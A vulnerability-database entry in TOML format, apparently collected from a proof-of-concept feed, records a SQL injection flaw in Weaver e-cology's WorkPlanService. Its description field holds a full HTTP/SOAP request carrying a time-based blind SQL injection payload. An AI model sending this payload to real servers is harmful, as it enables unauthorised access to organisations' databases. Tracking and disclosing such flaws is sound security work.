vulns/2024/AVE-2024-0163.toml

[basic]
description = "泛微 泛微e-cology workplanservice SQL注入漏洞 SQL注入 - POST /services/WorkPlanService HTTP/1.1 HOST: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 Content-Type: text/xml;charset=UTF-8 Connection: close &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:web=&quot;webservices.workplan.weaver.com.cn&quot;&gt; &lt;soapenv:Header/&gt; &lt;soapenv:Body&gt; &lt;web:deleteWorkPlan&gt; &lt;!--type: string--&gt; &lt;web:in0&gt;(SELECT 8544 FROM (SELECT(SLEEP(3-(IF(27=27,0,5)))))NZeo)&lt;/web:in0&gt; &lt;!--type: int--&gt; &lt;web:in1&gt;22&lt;/web:in1&gt; &lt;/web:deleteWorkPlan&gt; &lt;/soapenv:Body&gt; &lt;/soapenv:Envelope&gt;"
published = ""
remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
score = 5
severity = "MEDIUM"
sources = ["hwpoc"]
title = "泛微e-cology workplanservice SQL注入漏洞"
updated = ""

[exploit]
exp_urls = []
poc_urls = []

[id]
aliases = ["HWPOC-2024-023dd401"]
ave_id = "AVE-2024-0163"

[meta]
collected_at = "2026-07-18T08:06:20.863957526+00:00"
status = "completed"

[references]
urls = []
